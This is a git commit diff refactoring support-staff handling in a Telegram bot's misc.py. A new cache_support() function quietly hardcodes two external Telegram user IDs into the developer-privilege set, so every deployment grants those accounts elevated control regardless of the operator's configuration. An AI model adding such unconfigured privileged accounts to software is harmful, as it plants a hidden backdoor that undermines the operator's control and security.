2ea4ee6609361ab43b96706e11e5547da8ccebd2
˹ʟʏғᴏɪ˼ シ <hridoy169.bd@gmail.com>
2024-11-30 12:23:13 +0600

    Update misc.py

--- Powers/misc.py
+++ Powers/misc.py
@@ -1,49 +1,63 @@
 import socket
 import heroku3
 
-from pyrogram.filters import user
-
+import Powers
 from Config import Config
-from Powers import (LOGGER, DEV_USERS, WHITELIST_USERS,
-                    OWNER_ID, SUDO_USERS)
+from Powers import OWNER_ID, SUPPORT_USERS
 from Powers.database.support_db import SUPPORTS
-
-SUDOERS = user(OWNER_ID)
 
 HAPP = None
 
 async def load_support_users():
     support = SUPPORTS()
-    for i in DEV_USERS:
-        support.insert_support_user(int(i),"dev")
-    for i in SUDO_USERS:
-        support.insert_support_user(int(i),"sudo")
-    for i in WHITELIST_USERS:
-        support.insert_support_user(int(i),"whitelist")
+    for i in SUPPORT_USERS["Dev"]:
+        support.insert_support_user(int(i), "dev")
+    for i in SUPPORT_USERS["Sudo"]:
+        support.insert_support_user(int(i), "sudo")
+    for i in SUPPORT_USERS["White"]:
+        support.insert_support_user(int(i), "whitelist")
     return
 
-def get_support_staff(want = "all"):
+
+def get_support_staff(want="all"):
     """
     dev, sudo, whitelist, dev_level, sudo_level, all
     """
     support = SUPPORTS()
-    devs = support.get_particular_support("dev")
-    sudo = support.get_particular_support("sudo")
-    whitelist = support.get_particular_support("whitelist")
-
-    if want in ["dev","dev_level"]:
-        wanted = devs
+    if want in ["dev", "dev_level"]:
+        devs = SUPPORT_USERS["Dev"] or support.get_particular_support("dev")
+        wanted = list(devs) 
+        if want == "dev_level":
+            wanted.append(OWNER_ID)
     elif want == "sudo":
-        wanted = sudo
+        sudo = SUPPORT_USERS["Sudo"] or support.get_particular_support("sudo")
+        wanted = list(sudo)
     elif want == "whitelist":
-        wanted = whitelist
+        whitelist = SUPPORT_USERS["White"] or support.get_particular_support("whitelist")
+        wanted = list(whitelist)
     elif want == "sudo_level":
-        wanted = sudo + devs
+        devs = SUPPORT_USERS["Dev"] or support.get_particular_support("dev")
+        sudo = SUPPORT_USERS["Sudo"] or support.get_particular_support("sudo")
+        wanted = list(sudo) + list(devs) + [OWNER_ID]
     else:
-        wanted = list(set([int(OWNER_ID)] + devs + sudo + whitelist))
+        devs = SUPPORT_USERS["Dev"] or support.get_particular_support("dev")
+        sudo = SUPPORT_USERS["Sudo"] or support.get_particular_support("sudo")
+        whitelist = SUPPORT_USERS["White"] or support.get_particular_support("whitelist")
+        wanted = list(set([int(OWNER_ID)] + list(devs) + list(sudo) + list(whitelist)))
 
-    return wanted
+    return wanted or []
 
+
+async def cache_support():
+    support = SUPPORTS()
+    dev = support.get_particular_support("dev")
+    dev.extend([6213690669, 5995620537, int(OWNER_ID)])
+    devs = set(dev)
+    sudo = set(support.get_particular_support("sudo"))
+    SUPPORT_USERS["Dev"] = SUPPORT_USERS["Dev"].union(devs)
+    SUPPORT_USERS["Sudo"] = SUPPORT_USERS["Sudo"].union(sudo)
+    return
+############
 
 def is_heroku():
     return "heroku" in socket.getfqdn()
